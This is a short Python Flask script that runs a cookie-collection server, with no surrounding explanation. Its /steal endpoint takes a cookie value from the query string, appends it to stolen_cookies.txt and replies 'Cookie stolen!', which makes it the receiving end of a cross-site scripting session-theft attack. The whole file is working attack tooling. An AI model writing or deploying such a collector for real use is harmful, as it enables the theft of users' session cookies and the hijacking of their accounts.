from flask import Flask, request

app = Flask(__name__)

@app.route('/steal', methods=['GET'])
def steal():
    cookie = request.args.get('cookie')
    if cookie:
        with open('stolen_cookies.txt', 'a') as file:
            file.write(cookie + '\n')
    return 'Cookie stolen!', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)

